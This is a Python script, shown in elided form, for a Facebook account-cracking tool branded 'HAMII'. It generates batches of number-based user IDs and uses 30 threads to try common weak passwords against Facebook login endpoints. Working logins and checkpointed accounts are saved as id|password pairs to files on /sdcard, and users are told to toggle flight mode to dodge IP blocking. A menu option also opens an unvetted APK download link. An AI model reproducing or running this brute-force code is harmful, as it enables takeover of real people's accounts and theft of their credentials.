...
logo=("""\033[1;91m
           ...
           \033[1;97m| $$\  $$$| $$  | $$| $$/$$ $$  | $$  
           \033[1;97m| $$ \  $$| $$  | $$|  $$$$$$/ /$$$$$$
           \033[1;97m|__/  \__/|__/  |__/ \____ $$$|______/
           \033[1;97m|                          \__/         
      ...
      \t[×] Developed By  M Naqî Hassañ


 [+] Author     :    M Naqî Hassañ
 [+] WhatsApp   :   +923424370359
 [+] Facebook   :    M Naqî Hassañ
 [+] Version    :   0.1
 [+] Tool type  :   PRIVATE 
-----------------------------------------------------
 For Haters: Feel Thiis Power ♥️  👑
\033[1;37m-----------------------------------------------------""")
def linex():
        print('\033[1;37m-----------------------------------------------------')
def clear():
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse flight mode bsdk tera ip lol hx \033[1;37m")
                        linex()
                        for user in id:
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight mood bsdk tera ip lol h \033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/HAMII_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as HAMII:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mood bsdk tera ip lol h \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
                                HAMII.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HAMII-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        HAMII=session.cookies.get_dict().keys()
                        if "c_user" in HAMII:
                                print('\r\r\033[1;32m [HAMII-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HAMII-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in HAMII:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HAMII-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMII-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HAMII-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMII-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HAMII-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HAMII-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMII-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [HAMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMII-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
